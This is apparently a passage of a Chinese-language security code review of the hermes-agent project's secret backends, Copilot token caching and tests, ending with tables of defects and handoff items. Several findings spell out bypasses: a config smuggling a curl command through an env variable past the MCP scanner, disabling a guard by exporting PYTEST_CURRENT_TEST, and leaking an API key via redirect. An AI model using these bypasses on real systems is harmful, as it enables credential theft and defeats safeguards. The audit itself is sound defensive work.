| 形状 | **bulk** —— 拉一个 project 的全部 secret | **mapped** —— 显式把 env 名绑到 `op://vault/item/field` |
| 子命令 | setup / status / token / sync / disable / install | setup / status / token / set / remove / sync / disable |
| 区域 | 有 US/EU/自建的交互菜单 + `--server-url` + `BWS_SERVER_URL` | 用 `--account` |

不下载 `op` 的理由写在模块头:

`hermes_cli/onepassword_secrets_cli.py:11 @ 863e313`

```
Unlike Bitwarden, the ``op`` binary is NOT auto-installed: 1Password publishes
the CLI through OS package managers and signed installers, so Hermes expects
an already-installed, already-authenticated ``op`` and never downloads one.
```

两个后端共享同一套磁盘缓存底座(原子写 + 0600 + TTL 只实现一次),这是本簇里
"安全敏感逻辑只许有一份"做得最干净的地方:

`agent/secret_sources/_cache.py:1 @ 863e313`

```
"""Shared substrate for external secret-source backends.

Every backend (Bitwarden, 1Password, …) needs the same handful of
security-sensitive primitives:

  * a uniform result object (:class:`FetchResult`),
  * environment-variable name validation (:func:`is_valid_env_name`),
  * a two-layer fetch cache whose disk half writes atomically with ``0600``
    permissions and honours a TTL (:class:`DiskCache`, :class:`CachedFetch`).

These used to live inline inside ``bitwarden.py``.  Pulling them here means
the atomic-write / ``0600`` / TTL logic is audited and fixed in exactly one
place instead of drifting across copy-pasted per-backend modules — each
backend supplies only its own cache-key shape and a serializer for it.
```

对照 §10.3:`.copilot_jwt.json` 就是没有走任何这类底座的那个,于是把 0600 又写错了一遍。

### 9.2 旋转前先验证 —— 两边一致的好设计

两个 `cmd_token` 都是"先拿新 token 探一次上游,**成功了才落盘**",并在成功后清缓存
(旧缓存按旧 token 指纹做键)。这样一次手滑粘贴不会把还能用的 token 覆盖掉。

`hermes_cli/secrets_cli.py:369 @ 863e313`

```
def cmd_token(args: argparse.Namespace) -> int:
    """Rotate the BSM access token without re-running the whole setup wizard.

    Prompts for (or accepts via ``--access-token``) a new machine-account
    token, probes Bitwarden with it (unless ``--no-verify``), and only then
    persists it to .env — so a bad paste never bricks the working token.
    """
```

`hermes_cli/secrets_cli.py:432 @ 863e313`

```
    save_env_value(token_env, token)
    os.environ[token_env] = token
    # Old cached pulls are keyed on the previous token's fingerprint; drop
    # them so the next startup fetches fresh with the new credential.
    bw.clear_caches()
```

Bitwarden 侧还有一条非常具体的诊断:`invalid_client` / `400 bad request` **几乎总是区域错**
(拿 EU 的 token 打 US identity endpoint),于是把这条经验直接编码进错误分支:

`hermes_cli/secrets_cli.py:634 @ 863e313`

```
        lowered = err.lower()
        if "invalid_client" in lowered or "400 bad request" in lowered:
            console.print(
                "  [yellow]'invalid_client' from the US identity endpoint usually "
                "means the token is for a different Bitwarden region.  Re-run "
                "[cyan]hermes secrets bitwarden setup[/cyan] and pick EU or "
                "self-hosted at the region prompt, or set [cyan]secrets.bitwarden."
                "server_url[/cyan] in config.yaml.[/yellow]"
            )
```

还有一条小而好的做法:`hermes secrets onepassword set` **复用后端的引用校验器**,
并且存**校验后**的值,免得 CLI 和启动路径对"什么算合法 `op://` 引用"有两套看法:

`hermes_cli/onepassword_secrets_cli.py:257 @ 863e313`

```
def cmd_set(args: argparse.Namespace) -> int:
    console = Console()
    # Reuse the backend validator so the CLI and startup paths agree on what a
    # valid reference is — and store the *validated/stripped* value, not the
    # raw arg (so trailing whitespace never lands in config.yaml).
    valid, warnings = op_src._validate_references({args.env_var: args.reference})
```

### 9.3 ◇ "故意不脱敏"的子进程 —— 而且绕开了 §2 的收口

两个 CLI 调外部保管库 CLI 时都显式关掉了 hermes 的 secret 脱敏和 HOME 改写,并把理由写在注释里:

`hermes_cli/secrets_cli.py:610 @ 863e313`

```
    """Call ``bws project list`` and return the parsed list, or None on failure."""
    # Secret-manager CLI child: intentionally receives tokens — no scrub,
    # no HOME rewrite (bws stores state under the real user home).
    from tools.environments.local import build_subprocess_env
    env = build_subprocess_env(scrub_secrets=False, inherit_profile_home=False)
    env["BWS_ACCESS_TOKEN"] = token
```

`hermes_cli/onepassword_secrets_cli.py:513 @ 863e313`

```
    # 1Password CLI child: intentionally receives the service-account token —
    # no scrub, no HOME rewrite (op stores auth state under the real home).
    from tools.environments.local import build_subprocess_env
    env = build_subprocess_env(scrub_secrets=False, inherit_profile_home=False)
    env.setdefault("NO_COLOR", "1")
    if token_value:
        env["OP_SERVICE_ACCOUNT_TOKEN"] = token_value
```

这是对的设计:**默认脱敏,例外显式声明并写明理由**,而不是每个 spawn 点自己拼 `os.environ`。
`build_subprocess_env` 就是为了收口这件事而存在的:

`tools/environments/local.py:666 @ 863e313`

```
    """Single factory for building a child-process environment.

    Every spawn site in the codebase should build its env through this
    function (or :func:`hermes_subprocess_env` for the model-driving-CLI
    surface) instead of copying ``os.environ`` directly, so profile-home
    propagation (``HERMES_HOME`` / subprocess ``HOME`` contract) and the
    Hermes secret-scrub policy have a single owner.  History: ~11 separate
    commits each fixed one more spawn site that missed profile-HOME or
    secret-scrub propagation; this factory is the fix for the class.
```

**但**:两个 CLI 存 token 走的是 `save_env_value(token_env, token)`,**不是** §2 那个
`save_provider_env_credential` 收口。这在本例里无害(BWS/OP 的 bootstrap token 不是 provider
API key,没有 pool 条目、没有 config.yaml 镜像),但它证明了 §2.3 的判断:
**"应该走收口"没有任何强制,本簇内就有两个不走的例子。** → 记 **◇5**。

### 9.4 一条容易看漏的行为:`sync --apply` 只影响当前进程

`cmd_sync` 的 `--apply` 是 `os.environ[key] = secrets[key]` —— 只改**当前 Python 进程**的环境,
命令一退出就没了。文案是诚实的("Exported N secret(s) into current process."),
但用户看到 "export" 很容易以为是写进了 shell。默认 dry-run 的选择是对的。

---

## 10. `copilot_auth.py` —— 设备码 + JWT 交换 + 磁盘缓存

### 10.1 一次冷启动的走法

gateway 重启 → `load_pool("copilot")` → 拿到原始 GitHub token →
`exchange_copilot_token()`:先查进程内缓存,再查磁盘 `.copilot_jwt.json`,再查**失败负缓存**,
最后才发网络请求;换回来的是一个分号分隔的字符串(不是标准 JWT),
以及账号专属的 `base_url`(企业/代理账号才有)。

**为什么必须换**:注释交代得极清楚 —— 换失败会**静默降级成原始 GitHub token**,
而 Copilot 服务端会把原始 token 归到 `copilot-language-server` 这个 integrator,
它的模型白名单不含企业专属模型,于是**每一轮都 400,直到下次重启**:

`hermes_cli/copilot_auth.py:318 @ 863e313`

```
# Transient-failure hardening for the token exchange. Gateway startup often
# races network readiness (launchd relaunch, DHCP/VPN settling); a single-shot
# exchange that fails there silently degrades to the RAW GitHub token, which the
# Copilot server routes to the "copilot-language-server" integrator whose model
# allowlist omits enterprise-only models (e.g. claude-opus-4.8) → HTTP 400 on
# every turn until the next restart. Retry a few times, and persist the last
# good exchanged JWT to disk so a restart during a blip reuses the still-valid
# ~30-min token instead of degrading.
```

三层缓存的每一层都有具体的事故背书,这是本簇里"注释即事故档案"做得最好的文件:

`hermes_cli/copilot_auth.py:331 @ 863e313`

```
# Negative cache for failed exchanges. Without it, every load_pool("copilot")
# call re-runs the full exchange — and on a permanently-rejected token
# (HTTP 403: account not Copilot-entitled, expired grant, org policy) the
# retry backoff burned ~4.5s of time.sleep() on EVERY provider-discovery
# pass. The /model picker, delegation child spawns, and the web dashboard
# all walk that path, so a single bad Copilot token made all of them crawl.
```

对应地,**永久性拒绝(401/403/404)不走重试**,因为退避是给网络竞态用的,不是给鉴权失败用的:

`hermes_cli/copilot_auth.py:556 @ 863e313`

```
        except Exception as exc:  # noqa: BLE001 — retry all, re-raise below
            last_exc = exc
            status = getattr(exc, "code", None) or getattr(exc, "status", None)
            if status in _EXCHANGE_PERMANENT_HTTP_STATUSES:
                permanent_failure = True
                logger.debug(
                    "Copilot token exchange rejected (HTTP %s); not retrying",
                    status,
                )
                break
```

两档 TTL:瞬时 60s / 永久 1800s。缓存键一律是 token 的 sha256 前 16 位,**不存原文**。

还有一条运行时自愈路径:一旦真实请求开始报 `model_not_available_for_integrator`,
说明缓存里那个(可能是降级后的原始 token)已经馊了,于是**两层缓存一起清**,
连负缓存也清 —— 因为 evict 本身就是"强制重换"的显式信号:

`hermes_cli/copilot_auth.py:375 @ 863e313`

```
def evict_cached_exchanged_token(raw_token: str) -> None:
    """Drop any cached exchanged JWT for ``raw_token`` (in-process + on-disk).

    Used by the runtime stale-credential recovery path: when a live request
    starts failing with a Copilot ``model_not_available_for_integrator`` /
    ``model_not_supported`` 400, the cached exchanged token (or a degraded raw
    fallback that was cached in its place) is stale. Evicting both cache tiers
    forces the next ``exchange_copilot_token`` call to hit the network and mint
    a fresh token instead of returning the poisoned cache entry.
    """
```

### 10.2 ▲ docstring 说"只有经典 PAT 时抛 ValueError",实际不抛

`hermes_cli/copilot_auth.py:75 @ 863e313`

```
def resolve_copilot_token() -> tuple[str, str]:
    """Resolve a GitHub token suitable for Copilot API use.

    Returns (token, source) where source describes where the token came from.
    Raises ValueError if only a classic PAT is available.
    """
```

但 #60800 之后,**只要有任何一个 Copilot env 变量被设过**,就直接返回 `("", "")`,
根本走不到那个 `raise`:

`hermes_cli/copilot_auth.py:104 @ 863e313`

```
    if any_env_var_set:
        logger.debug(
            "Copilot env var(s) set but none held a supported token; "
            "skipping `gh auth token` fallback to honor explicit env-var "
            "intent (and avoid the subprocess cost on cold start, #60800)."
        )
        return "", ""

    token = _try_gh_cli_token()
    if token:
        valid, msg = validate_copilot_token(token)
        if not valid:
            raise ValueError(
                f"Token from `gh auth token` is a classic PAT (ghp_*). {msg}"
            )
        return token, "gh auth token"

    return "", ""
```

实测(`GITHUB_TOKEN=ghp_xxxx…`,其余两个变量清空):

```console
Token from GITHUB_TOKEN is not supported: Classic Personal Access Tokens (ghp_*) are not supported by the Copilot API. ...
resolve_copilot_token() -> ('', '')
validate_copilot_token(ghp_) -> False
```

→ 记 **▲5**。同一处陈腐还波及模块头的"Credential search order"清单
(第 4 项 `gh auth token` 现在是**有条件**的)与 token 类型表
(`gho_ … (default via copilot login)` —— 但 OAuth client id 已换成 VS Code 的 App ID,
按同文件 34-41 行的注释,它产出的是 `ghu_*`)。这三处是同一句陈腐的三个面,合并为 ▲5。

`hermes_cli/copilot_auth.py:34 @ 863e313`

```
# OAuth device code flow constants — VS Code's GitHub App client ID.
# The previous opencode OAuth App ID (Ov23li8tweQw6odWQebz) produces gho_*
# tokens that cannot be exchanged for Copilot API JWTs (404 on
# /copilot_internal/v2/token). VS Code's App ID produces ghu_* tokens
# that support exchange, which is required to access internal-only models
# (e.g. claude-opus-4.6-1m) and enterprise endpoints.
```

### 10.3 ■ JWT 落盘是"先写后 chmod",同仓已有正确写法

`hermes_cli/copilot_auth.py:463 @ 863e313`

```
            "base_url": base_url,
        }
        tmp = path.with_suffix(path.suffix + ".tmp")
        tmp.write_text(json.dumps(store), encoding="utf-8")
        try:
            os.chmod(tmp, 0o600)
        except Exception:
            pass
        os.replace(tmp, path)
        try:
            os.chmod(path, 0o600)
        except Exception:
            pass
```

`Path.write_text` 按 umask 建文件(常见 0644),**chmod 之前有一个窗口**。同一个仓库里
`_save_auth_store` 早就把这个窗口关了,而且注释里点名了两个历史 issue:

`hermes_cli/auth.py:1301 @ 863e313`

```
        # Create with 0o600 atomically via os.open(O_EXCL) + fdopen to close
        # the TOCTOU window where default umask (often 0o644) briefly exposed
        # OAuth tokens to other local users between open() and chmod().
        # Mirrors agent/google_oauth.py (#19673) and tools/mcp_oauth.py (#21148).
        fd = os.open(
            str(tmp_path),
            os.O_WRONLY | os.O_CREAT | os.O_EXCL,
            stat.S_IRUSR | stat.S_IWUSR,
        )
```

实测(umask 022,给 `_save_jwt_to_disk` 的 `os.chmod` 打桩记录调用前的 mode):

```console
umask                     : 0o22
tmp mode BEFORE chmod     : {'/tmp/tmpmrm0k5gj/.copilot_jwt.json.tmp': '0o644', '/tmp/tmpmrm0k5gj/.copilot_jwt.json': '0o600'}
final .copilot_jwt.json   : 0o600
HERMES_HOME dir mode      : 0o700
```

**缓解**:非 managed 模式下 `ensure_hermes_home()` 会把家目录 `_secure_dir` 到 0700,
外人进不去,窗口打不到。**但 managed(NixOS)模式下家目录是 setgid + 组可写(2770)**:

`hermes_cli/config.py:867 @ 863e313`

```
def ensure_hermes_home():
    """Ensure ~/.hermes directory structure exists with secure permissions.

    In managed mode (NixOS), dirs are created by the activation script with
    setgid + group-writable (2770). We skip mkdir and set umask(0o007) so
    any files created (e.g. SOUL.md) are group-writable (0660).
```

同组用户就能在那一瞬读到 0644 的 tmp。
另外 `_save_jwt_to_disk` 也**没有**调 `secure_parent_dir`,不像 `_save_auth_store` 那样自己去收紧父目录。
→ 记 **■7**(低危,但同仓已有正确范式且注释里点了名,属于"漏了一个点"而非"没想到")。

### 10.4 一条设计细节:`gh auth token` 调用前要先把 env 里的 token 摘掉

否则 `gh` 会直接把 `GITHUB_TOKEN` 回显给你,拿不到它自己 credential store 里的那个:

`hermes_cli/copilot_auth.py:145 @ 863e313`

```
def _try_gh_cli_token() -> Optional[str]:
    """Return a token from ``gh auth token`` when the GitHub CLI is available.

    When COPILOT_GH_HOST is set, passes ``--hostname`` so gh returns the
    correct host's token.  Also strips GITHUB_TOKEN / GH_TOKEN from the
    subprocess environment so ``gh`` reads from its own credential store
    (hosts.yml) instead of just echoing the env var back.
    """
```

---

## 11. 测试作行为规格

### 11.1 跑了什么、结果如何

三批,共 **22 个文件 / 131 个用例,0 失败**。环境:venv **87 个包**、Python 3.11.15、root、无 IPv6、离线。

```verify
cd /home/user/hermes-agent && HERMES_PYTHON=/home/user/hermes-venv/bin/python bash scripts/run_tests.sh \
  tests/hermes_cli/test_credential_lifecycle.py tests/hermes_cli/test_urllib_security.py \
  tests/hermes_cli/test_mcp_security.py tests/hermes_cli/test_security_audit.py \
  tests/hermes_cli/test_security_audit_startup.py tests/hermes_cli/test_security_advisories.py
# === Summary: 6 files, 44 tests passed, 0 failed (100% complete) in 4.8s (8 workers) ===
```

| 批次 | 文件数 | 用例 | 结果 |
|---|---|---|---|
| credential_lifecycle / urllib_security / mcp_security / security_audit / security_audit_startup / security_advisories | 6 | 44 | 全过 |
| managed_scope ×9 | 9 | 20 | 全过 |
| copilot_auth / copilot_token_exchange / secrets_bitwarden_non_tty / secrets_token_rotation / onepassword_secrets / bitwarden_secrets / credential_file_permissions | 7 | 67 | 全过 |

**本簇没有踩到已知的三条环境限制**(无 IPv6 / root / 离线):这些测试都不绑端口、不判权限位、不查 models.dev。

### 11.2 ■ 测试密度:最要紧的契约恰恰没有测试

`tests/hermes_cli/test_credential_lifecycle.py` **只有 2 个用例**,而且都不测模块的头号契约。
文件里留着**空的小节标题**和**定义了却没人用的脚手架**:

```verify
cd /home/user/hermes-agent && grep -c "^def test_" tests/hermes_cli/test_credential_lifecycle.py && \
  for n in _read_auth _zai_pool_fixture FAKE_OAUTH_TOKEN NEW_KEY; do \
    printf "%-20s %s\n" "$n" "$(grep -c "$n" tests/hermes_cli/test_credential_lifecycle.py)"; done
# 2
# _read_auth           1
# _zai_pool_fixture    2
# FAKE_OAUTH_TOKEN     2
# NEW_KEY              1
```

`tests/hermes_cli/test_credential_lifecycle.py:85 @ 863e313`

```
# ---------------------------------------------------------------------------
# DELETE — #51071 / #59761: stale credential_pool entries must be pruned
# ---------------------------------------------------------------------------
```

(这三行之后直到下一个小节标题之间,只有空行 —— 该小节 0 个测试。)

`_read_auth` 出现 1 次(自己的 def)= 从没被调用;`NEW_KEY` 出现 1 次(自己的赋值)= 从没被用。
`_zai_pool_fixture` 造了"1 条 env 条目 + 1 条 OAuth 条目"的夹具 —— 那正是 OAuth 保全契约的形状 ——
却只在一处被取了 `["zai"][0]`(只用 env 那条)。三个空标题:

- `# DELETE — #51071 / #59761: stale credential_pool entries must be pruned` → **0 个测试**
- `# Suppression round-trip: delete sticks, re-add lifts it` → **0 个测试**

即:**"删 API key 不撤 OAuth"和"删除粘得住"这两条模块自称的核心契约,没有任何自动化验证。**
§5.5 的 `test_security_audit_startup.py` 是同一个形状(5 个标题、3 个测试、四项检查里三项没直测)。
→ 记 **■8**(与 ■4 同因,分开计,因为它们是两个不同模块的可回归性缺口)。

### 11.3 值得抄的测试写法

`tests/hermes_cli/test_urllib_security.py` 是**线级(wire-level)**测试:起两个真实的
`ThreadingHTTPServer`,让第一个 302 到第二个,断言第二个**在 wire 上**没收到凭据头。
不 mock `urlopen`、不断言内部调用 —— 这是唯一能真的证明"没泄漏"的写法,
因为泄漏发生在 handler 链的最末端(见 §3.2 那三层)。

`tests/hermes_cli/test_urllib_security.py:190 @ 863e313`

```
def test_installed_request_processor_cannot_resurrect_cross_origin_secret(
    monkeypatch,
):
    source = _server()
    sink = _server()
    _RecordingHandler.requests = []
    _RecordingHandler.redirect_status = 302
    _RecordingHandler.redirect_to = f"http://localhost:{sink.server_port}/sink"

    class SecretProcessor(urllib.request.BaseHandler):
        handler_order = float("inf")  # type: ignore[assignment]

        def http_request(self, request):
            request.add_header("X-Installed-Secret", "must-not-cross")
            return request

    installed = urllib.request.build_opener(SecretProcessor())
    installed.addheaders = [("X-Opener-Secret", "also-must-not-cross")]
    monkeypatch.setattr(urllib.request, "_opener", installed)
```

这个用例把 §3.2 的第二层和第三层**同时**钉死了:装一个也用 `float("inf")` 的处理器,
再给 opener 塞 `addheaders`,断言两者都跨不过去。

另外 `tests/hermes_cli/test_credential_lifecycle.py` 的一条约定值得抄:

`tests/hermes_cli/test_credential_lifecycle.py:9 @ 863e313`

```
All fake secrets are constructed at runtime so no key-shaped literal ever
lands in the repo.
```

—— 假凭据一律运行时拼(`"zk-" + "a" * 24`),免得 secret scanner 对着测试文件报警。

---

## 12. 本簇定案表

### ▲(文档所述与代码矛盾)—— 5 条

| # | 位置 | 文档说 | 代码是 |
|---|---|---|---|
| ▲1 | `agent/secret_sources/__init__.py:16-30`(bundled 清单 + "possible future exception")、`registry.py:22-23`、`website/docs/user-guide/secrets/index.md:49`("## Adding your own backend"标题下) | 内建来源只有 Bitwarden + 1Password;command 是"可能的未来例外" | `registry.py:180-186` 把 `CommandSource` 注册为内建;`command.py` 501 行已在树里;同一网站页顶部又把它列为受支持 |
| ▲2 | `hermes_cli/managed_scope.py:13`、`hermes_cli/env_loader.py:567`、`config.py:3395`、`doctor.py:689` 指向 `docs/design/managed-scope.md`;`hermes_cli/security_audit.py:14` 指向 `references/security-disclosure-triage.md` | 这两份设计文档存在 | 两份都不在基线里(`ls docs/design/` 只有 `profile-builder.md`;`references/` 目录不存在) |
| ▲3 | `hermes_cli/security_audit_startup.py:33-34` | 哨兵是为了"CLI **和** gateway 两条启动路径都调用"时只跑一次 | 全仓唯一生产调用点是 `gateway/run.py:26570`;CLI 从不调 |
| ▲4 | `hermes_cli/security_audit_startup.py:193-194` | `_network_listener_without_auth` "Covers the API server … **and the dashboard**" | 函数体只有 API server 一段,没有任何 dashboard 分支 |
| ▲5 | `hermes_cli/copilot_auth.py:79`("Raises ValueError if only a classic PAT is available")+ 模块头第 12-16 行的搜索顺序清单 + 第 8-9 行的 token 类型表 | 只有经典 PAT 时抛 ValueError;`gh auth token` 是第 4 顺位;`copilot login` 默认产 `gho_` | 设过任一 Copilot env 变量就直接返回 `("","")`(实测);`gh` 回落是**有条件**的;本文件的 OAuth client id 已换成 VS Code App ID,产 `ghu_`(第 34-40 行注释自证) |

### ◇(代码有、文档无)—— 5 条

- **◇1** `urllib_security` 这条凭据重定向策略只被 4 个文件、5 处非测试调用点采用,全仓有 60+ 个裸 `urlopen`;没有任何 lint/测试/运行时机制阻止新调用点绕过。文档(含 `website/docs/developer-guide/`)未交代这条策略的存在与适用面。
- **◇2** 仓里有**两套** OSV 客户端:`hermes_cli/security_audit.py`(`/v1/querybatch`,CVE,按需)与 `tools/osv_check.py`(`/v1/query`,只看 MAL-\*,spawn 前,fail-open)。语义不同是合理的,但无文档说明二者关系。
- **◇3** `hermes security audit` 会把本机 venv 中**每个包的名字与版本**POST 给 `api.osv.dev`;`cli-commands.md` 的 `hermes security` 一节与模块 docstring 都没提这一层数据外发。
- **◇4** `hermes_cli/security_advisories.py:61` 注释指引用 `superseded_by` 标记被取代的 advisory,而 `Advisory` dataclass 没有这个字段。
- **◇5** 本簇两个 secrets CLI 存 token 走 `save_env_value`,不走 §2 的 `save_provider_env_credential` 收口 —— 证明"every surface should route through"没有强制力(此处无害,但形状在)。

### ■(代码缺陷)—— 8 条

| # | 严重度 | 位置 | 现象 |
|---|---|---|---|
| ■1 | **高** | `hermes_cli/credential_lifecycle.py:78-107` + `auth.py:1575-1580` + `agent/credential_pool.py:3086` | profile 模式下删凭据只剪 profile 的 `auth.json`;`read_credential_pool` 会回落全局根,抑制标记又只在**播种**时生效、不过滤已落盘条目 → 被删的 key 在该 profile 里仍然可用(#51071 形状重开) |
| ■2 | **中高** | `hermes_cli/models.py:4612` | `Authorization: Bearer {AI_GATEWAY_API_KEY}` 走裸 `urlopen`;`base_url` 由 env 可控 → 一个 302 就能把 key 交给第三方主机(§3.1 已实测 stdlib 会转发) |
| ■3 | **中高** | `hermes_cli/managed_scope.py:49` | `_under_pytest()` 只看 `PYTEST_CURRENT_TEST` 在不在 env 里;生产环境任何用户 `export PYTEST_CURRENT_TEST=x` 即让 managed scope 整层消失,连写守卫一起失效(已实测)。文档的 v1 限制清单没有这一条 |
| ■4 | 中 | `hermes_cli/security_audit_startup.py:190-223` + `tests/…/test_security_audit_startup.py` | docstring 声称覆盖 dashboard 的检查未实现;且四项检查里三项没有直测(测试文件里留着空小节标题) |
| ■5 | 中 | `hermes_cli/mcp_security.py:149-177` + `tools/mcp_tool.py:4668` | 出网/持久化形状扫描**只读 `args`**(IOC 扫描却读 `env`),且过滤发生在 `_interpolate_env_vars` **之前**;`{"command":"bash","args":["-c","$P"],"env":{"P":"curl …"}}` 直接放行(已实测) |
| ■6 | 中 | `hermes_cli/security_audit.py:343-365` | `score` 初始化后从未赋值 → CVSS 分数→等级映射 8 行是死代码;只带 CVSS 向量的 `PYSEC-*` 记录一律 `UNKNOWN`,而 `UNKNOWN` 排在 `LOW` 之下 → 默认 `--fail-on critical` 对绝大多数 PyPI 漏洞退出码 0(已实测) |
| ■7 | 低 | `hermes_cli/copilot_auth.py:465-468`(及 `:400-406` 的 evict 路径同形) | `.copilot_jwt.json` 走"write_text 后再 chmod",有 0644 窗口(已实测);同仓 `auth.py:1301-1309` 早已用 `os.open(O_EXCL, 0600)` 关掉该窗口并点名两个历史 issue;managed(2770 家目录)模式下窗口对同组可见 |
| ■8 | 中 | `tests/hermes_cli/test_credential_lifecycle.py` | 模块两条头号契约(OAuth 保全、删除粘性)**零测试**;文件里留着空小节标题与未被调用的夹具/常量 |

### ◎(文档成立但显著保守)—— 0 条

本簇未发现符合 ◎ 定义(字面为真但显著低估)的条目。§8.2 那条一度像 ◎,但"if needed"是条件式表述,
按记号规则归 ◇4。

---

## 13. 移交项(每条带锚点文件 + 一句话现象)

1. **H-8D-1(高)** `hermes_cli/credential_lifecycle.py:78`(`_prune_env_pool_entries` 用
   `_load_auth_store()`/`_save_auth_store()`,均为 profile 作用域)vs `hermes_cli/auth.py:1578`
   (`read_credential_pool` 在 profile 无条目时回落全局根):**profile 模式下删掉的 env 凭据,
   其全局根 pool 条目仍被读到、且 `suppressed_sources` 不过滤已落盘条目**。
   未取证的部分:实际跑一次 profile 场景的端到端复现(需要构造 `<root>/profiles/<name>` 家目录)。
   本轮只从代码路径推导 + 单点验证了 `read_credential_pool` 的回落分支。

2. **H-8D-2(中高)** `hermes_cli/models.py:4612`:`with urllib.request.urlopen(req, timeout=timeout)`
   紧跟在 `"Authorization": f"Bearer {api_key}"` 之后,而同文件 `:41` 就有
   `_urlopen_model_catalog_request` 这个安全包装器。**需要普查全仓 60+ 个裸 `urlopen` 里
   还有哪些带凭据**(本轮只逐点确认了 `models.py:4612` 与 `hermes_cli/copilot_auth.py:553` 两处;
   `hermes_cli/nous_billing.py:413`、`hermes_cli/dashboard_register.py:141`、
   `gateway/relay/__init__.py:472` 等看起来也带认证头,**未逐一取证**)。

3. **H-8D-3(中高)** `hermes_cli/managed_scope.py:49`:`return "PYTEST_CURRENT_TEST" in os.environ`
   —— 生产进程里这个变量存在即让整层 managed scope 返回 None(已实测)。
   还需查:`_load_global_auth_store`(`hermes_cli/auth.py:1072`)用了同样的
   `os.environ.get("PYTEST_CURRENT_TEST")` 守卫,**全仓还有多少处安全相关判断挂在这个变量上**
   —— 本轮未做这个普查。

4. **H-8D-4(中)** `hermes_cli/security_audit.py:343`:`score: Optional[float] = None` 之后
   没有任何赋值语句,导致 `:357` 的 `if score is not None:` 不可达。
   需要确认的是**上游是否真的这么频繁只给 CVSS 向量** —— 本轮离线,
   只用构造记录验证了函数行为,没有对真实 OSV 返回做采样。

5. **H-8D-5(中)** `tests/hermes_cli/test_credential_lifecycle.py:83` 与 `:139` 两处空小节标题
   (`# DELETE — #51071 / #59761: …` / `# Suppression round-trip: …`)下 0 个测试,
   `_read_auth` / `NEW_KEY` 定义后从未被引用。**看起来像是有一批测试被删过**;
   下一轮若要写"测试即行为规格"的章节,这是一个可对比的"规格蒸发"样本。
   同形样本:`tests/hermes_cli/test_security_audit_startup.py:20-40` 的四个空小节标题。

6. **H-8D-6(低)** `agent/secret_sources/registry.py:22`("deliberately closed (Bitwarden,
   and 1Password once it lands)")与 `:180-186`(已注册 `CommandSource`)矛盾。
   下一轮做 `agent/secret_sources/` 簇时,`command.py`(501 行,能执行任意用户命令取 secret)
   本身的安全模型**本轮完全没读**,需要单独处理。

---

## 14. 可迁移的设计原则(给自己造 harness 用)

1. **凭据的"删除"必须是跨存储事务,而且要有唯一收口。** 只删一处的删除按钮会长出一整个 bug family。
   收口函数的返回值只带**名字与路径**,永不带值。
2. **收口靠约定就会漏。** 本簇同时给了正例(4 个界面都走了)和反例(本簇自己两个 CLI 没走、
   13 个 `apply_managed_overlay` 挂载点全靠手动)。**如果一个策略必须被 N 个调用点采用,
   就要有机制让第 N+1 个调用点无法绕过**(收口在更底层的写函数里、或加一条 lint/测试)。
3. **跨源转发凭据要用白名单,不要猜凭据头的名字。** 只要允许用户配自定义 header,
   黑名单就永远追不上;`{accept, user-agent}` 这种小白名单才是可维护的。
4. **净化必须站在链路最末端。** 三层(重定向策略 / 末位 processor / opener 的 addheaders)
   缺一层就能被"合法的"处理器把凭据加回去。测试要在 **wire 上**断言,而不是断言内部调用。
5. **"不可变"要写清楚被什么强制。** "filesystem permissions only" 是诚实的;
   "user-immutable" 是营销。**任何读环境变量做的策略开关,都是一个可被环境变量关掉的策略。**
6. **审计工具的假阳性会训练用户忽略输出**(作者原话),所以宁可漏也不猜;
   但**假阴性不能悄悄发生** —— `UNKNOWN` 排在 `LOW` 之下 + 打分死代码 =
   一道看起来在工作的假门禁。**任何"退出码即门禁"的工具,必须有一条测试证明它真的会失败。**
7. **形状检测(shape matching)只能挡"照抄的攻击",不能挡"改一个字的攻击"。**
   要么承认这一点(本模块 docstring 前半段做到了),要么就别在同一段文字里写
   "caught before it can execute"。
8. **"warn-only" 的安全信号,要按它想避免的事故来选投递渠道。** 一条只进 gateway.log 的
   WARNING,救不了"运维根本没看日志"这个原始事故。同仓的 `security_advisories`
   (三条渠道 + 24h 去重 + 可 ack)才是这类信号的正确形状。
9. **凭据落盘只有一种正确写法**:`os.open(O_CREAT|O_EXCL, 0600)` + fdopen + 原子替换 + 收紧父目录。
   写完再 chmod 是有窗口的。仓里已经有正确范式时,新代码却用了旧写法,说明这条知识
   只活在一处注释里、没有变成可复用的函数 —— **把它做成一个 `write_secret_file()` 才是真的修好了。**

---

## 15. 延伸

- 本簇未展开、但与结论强相关的邻接代码:`agent/secret_sources/`(registry / bitwarden /
  onepassword / **command** / _cache,3,293 行)、`agent/credential_pool.py` 的播种与抑制、
  `hermes_cli/env_loader.py` 的 `.env` 加载与 secret-source 编排。
- 基线自查:本轮全部操作后 `git -C /home/user/hermes-agent status --porcelain` 为空。
